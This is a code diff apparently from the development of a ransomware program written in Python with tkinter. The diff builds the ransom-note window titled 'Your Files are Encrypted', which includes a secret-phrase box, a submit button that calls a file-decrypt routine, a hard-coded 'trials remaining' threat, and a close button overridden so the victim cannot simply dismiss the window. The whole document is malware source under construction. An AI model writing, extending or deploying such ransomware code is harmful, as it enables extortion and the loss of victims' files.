@@ -111,9 +111,35 @@ def decrypt (user_phrase):
             # write changes in the file
             with open (file, "wb") as newFile:
                 newFile.write(decrypted_content)
+        return True
+    else:
+        return False
 # submit fuunction
+def submit():
+    user_phrase = input.get().strip()
+    if not user_phrase:
+        messagebox.showwarning("input required", "you must enter secret phrase to continue")
+        return
+    done = decrypt(user_phrase)
 
+    if not done:
+        messagebox.showerror("Incorrect secret phrase", "You entered the wrong Phrase. 2 trials remaining")
+
+    else:
+        messagebox.showinfo("congrats!", "awesome, your files have been decrypted")
 # onclose function
+def onclose():
+    user_phrase = input.get().strip()
+    if not user_phrase:
+        messagebox.showwarning("input required", "you must enter secret phrase to continue")
+        return
+    done = decrypt(user_phrase)
+
+    if not done:
+        messagebox.showerror("Incorrect secret phrase", "You entered the wrong Phrase. 2 trials remaining")
+
+    else:
+        messagebox.showinfo("congrats!", "awesome, your files have been decrypted")
 
 # read files
 def relativePath(relative_path):
@@ -134,6 +160,9 @@ root.title("Your Files are Encrypted")
 root.resizable(False, False)
 root.config(bg="#cc0000")
 
+
+# ovewrite the close button
+root.protocol("WM_DELETE_WINDOW", onclose)
 
 # ican image
 icon = tk.PhotoImage(file=relativePath("images.png"))
@@ -164,7 +193,7 @@ title.pack(pady=5)
 
 try:
     image = Image.open(relativePath("images.png"))
-    image = image.resize(80, 80)
+    image = image.resize((120, 120))
     lock_img =ImageTk.PhotoImage(image)
     image_label = tk.Label(root, image=lock_img, bg="#cc0000")
     image_label.pack(pady=(15,5))
@@ -201,6 +230,18 @@ msg.pack(pady=5)
 input = tk.Entry(root, width=30, font=("Arial", 14))
 input.pack(pady=15)
 input.pack(padx=30)
+input.focus()
+
+# submit button
+submit_btn = tk.Button(
+     root,
+     text="submit",
+     command= submit,
+     width=15,
+     font=("Arial", 14)
+
+ )
+submit_btn.pack(pady=10)
 # SHOW THE DIALOGUE 
 root.mainloop()
 
